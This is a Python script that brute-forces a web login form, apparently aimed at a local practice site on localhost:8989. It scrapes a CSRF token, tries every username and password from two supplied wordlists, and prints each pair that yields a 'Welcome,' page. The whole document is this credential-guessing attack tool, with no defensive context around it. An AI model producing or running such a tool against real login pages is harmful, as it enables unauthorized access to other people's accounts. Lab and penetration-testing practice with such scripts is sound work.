import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--usernames',
                    help='list of usernames', required=True)
parser.add_argument('-p', '--passwords',
                    help='list of passwords', required=True)
args = parser.parse_args()


def make_request(username, password, token):
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0',
               'Referer': 'http://localhost:8989/index.php'}
    data = {'username': username, 'password': password,
            'csrf_token': token, 'submit': ''}
    response = session.post(
        'http://localhost:8989/index.php', headers=headers, data=data)
    if 'Welcome,' in response.text:
        print('\033[92m' + 'Valid username and password: ' +
              username + ':' + password + '\033[0m')


def main():
    with open(args.usernames, 'r') as f1, open(args.passwords, 'r') as f2:
        usernames = [line.strip() for line in f1.readlines()]
        passwords = [line.strip() for line in f2.readlines()]

    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0',
               'Referer': 'http://localhost:8989/index.php'}
    response = session.get('http://localhost:8989/index.php', headers=headers)
    token = response.text.split('name="csrf_token" value="')[1].split('"')[0]

    for username in usernames:
        for password in passwords:
            make_request(username, password, token)


if __name__ == '__main__':
    main()
